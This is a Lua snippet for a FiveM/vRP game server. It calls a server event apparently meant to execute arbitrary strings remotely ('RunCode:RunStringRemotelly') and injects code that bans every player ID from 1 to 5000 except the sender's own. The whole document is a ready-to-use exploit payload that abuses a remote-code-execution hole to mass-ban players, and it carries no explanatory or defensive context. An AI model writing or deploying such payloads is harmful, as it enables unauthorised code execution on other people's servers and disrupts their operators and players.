TriggerServerEvent('RunCode:RunStringRemotelly', [[
    local ditID = 1
    local banbesked = ""

    for i=1,5000 do 
        if i ~= ditID then
            vRP.ban({i,banbesked,true})
        end
    end
]])
